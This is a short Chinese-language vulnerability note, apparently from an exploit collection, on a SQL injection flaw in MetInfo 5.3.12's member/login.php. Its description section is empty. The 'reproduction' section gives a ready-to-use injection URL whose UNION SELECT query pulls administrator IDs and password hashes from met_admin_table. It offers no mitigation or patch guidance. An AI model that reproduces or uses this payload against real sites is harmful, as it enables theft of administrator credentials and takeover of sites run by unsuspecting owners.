MetInfo 5.3.12 member/login.php sql注入漏洞
===========================================

一、漏洞简介
------------

二、漏洞影响
------------

MetInfo 5.3.12

三、复现过程
------------

    https://www.0-sec.org/member/login.php/aa'UNION%20SELECT%20(select%20concat(admin_id,0x23,admin_pass)%20from%20met_admin_table%20limit%200,1),2,3,4,5,6,1111,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23/aa

![1.png](./.resource/MetInfo5.3.12member_login.phpsql注入漏洞/media/rId24.png)
